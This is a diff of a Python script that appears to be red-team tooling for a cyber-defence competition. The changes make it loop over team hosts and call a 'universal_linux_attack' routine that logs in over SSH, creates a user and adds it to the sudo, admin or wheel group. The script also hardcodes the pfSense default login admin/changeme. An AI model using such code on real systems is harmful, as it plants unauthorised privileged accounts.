@@ -24,25 +24,29 @@ class Team:
         self.centos = Host(team_number, last_octet=11)
         self.pfsense = Host(team_number, last_octet=2, username="admin", password="changeme")
 
-last_octet = {}
-last_octet['ubuntu'] = 23
-last_octet['centos'] = 11
-last_octet['pfsense'] = 2
+def main():
+    last_octet = {}
+    last_octet['ubuntu'] = 23
+    last_octet['centos'] = 11
+    last_octet['pfsense'] = 2
 
-teams_numbers = range(1,11)
-teams = []
+    teams_numbers = range(1,3)
+    teams = []
 
-base_ip = [172, 31, 20, 0]
+    base_ip = [172, 31, 20, 0]
 
-for i in teams_numbers:
-    teams.append(Team(i))
-    print(i)
+    for i in teams_numbers:
+        teams.append(Team(i))
+        print(i)
 
-for team in teams:
-    print(team.number)
-    print(team.ubuntu.ip)
-    print(team.centos.ip)
-    print(team.pfsense.ip)
+    for team in teams:
+        print(team.number)
+
+        print(team.ubuntu.ip)
+        universal_linux_attack(team.ubuntu.ip)
+        print(team.centos.ip)
+        universal_linux_attack(team.centos.ip)
+        print(team.pfsense.ip)
 
 def get_ssh_pub():
     home = expanduser("~")
@@ -75,7 +79,7 @@ def universal_linux_attack(host):
     ssh.sendline(user_passwd_cmd)
 
     # add user to sudoers
-    sudo_add_cmd = "usermod -a -G sudo {0}} || usermod -a -G wheel {0}".format(username)
+    sudo_add_cmd = "usermod -a -G admin {0}} || usermod -a -G wheel {0}".format(username)
     ssh.prompt()
     ssh.sendline(sudo_add_cmd)
 
@@ -135,3 +139,5 @@ def centos_attacks(host):
     # sudo update-rc.d httpd disable
     # lol
     pass
+
+main()
